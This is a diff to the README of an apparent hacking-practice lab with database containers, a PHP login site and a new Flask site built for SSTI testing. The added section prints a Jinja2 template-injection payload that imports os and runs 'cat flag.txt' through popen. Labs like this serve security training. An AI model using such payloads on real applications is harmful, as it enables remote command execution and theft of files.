@@ -9,11 +9,14 @@ This repository includes environments for various databases and a login-enabled 
 - [2. Repository Contents](#2-repository-contents)
   - [2.1. mysql](#21-mysql)
   - [2.2. mongo](#22-mongo)
-  - [2.3. web-server](#23-web-server)
+  - [2.3. web-server-php](#23-web-server-php)
   - [2.3.1. Accessing the Web Server](#231-accessing-the-web-server)
   - [2.3.2. Pages](#232-pages)
     - [2.3.3. Implemented Web APIs](#233-implemented-web-apis)
-  - [2.4. client](#24-client)
+  - [2.4. web-server-flask](#24-web-server-flask)
+  - [2.4.1 Accessing the Web Server](#241-accessing-the-web-server)
+  - [2.4.2 try to execute ssti attack](#242-try-to-execute-ssti-attack)
+  - [2.5. client](#25-client)
 - [3. How to Use](#3-how-to-use)
 - [4. Notes](#4-notes)
 - [Disclaimer](#disclaimer)
@@ -34,19 +37,15 @@ A widely-used relational database management system (RDBMS).
 ### 2.2. mongo
 A popular NoSQL database.
 
-### 2.3. web-server
+### 2.3. web-server-php
 A simple website prepared to interact with the databases.
 
 Built with Apache, PHP, and HTML.
-2.3.1. Accessing the Web Server
-Open a browser and navigate to http://localhost:4200.
-
-
 
 ### 2.3.1. Accessing the Web Server
 Open a browser and navigate to http://localhost:4200.
 
-![alt text](/assets/web-server-top-page.png)
+![alt text](/assets/web-server-php-top-page.png)
 
 
 ### 2.3.2. Pages
@@ -63,8 +62,21 @@ The pages can be found under the web-server/html directory.
      - queries the database to check if the provided username and password exist.
      - returns success if the combination exists; otherwise, returns a failure message.
   
+### 2.4. web-server-flask
+A simple website prepared for checking ssti attack
 
-### 2.4. client
+Built with python flask
+
+### 2.4.1 Accessing the Web Server
+Open a browser and navigate to http://localhost:5000.
+
+### 2.4.2 try to execute ssti attack
+input the following text and click the submit button.
+`{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}`
+
+![alt text](/assets/web-server-flask-top-page.png)
+
+### 2.5. client
 A container for testing hacking tools such as sqlmap.
 Includes tools (planned) for adding, deleting, and modifying records in MongoDB and MySQL databases, as well as displaying database contents.
 
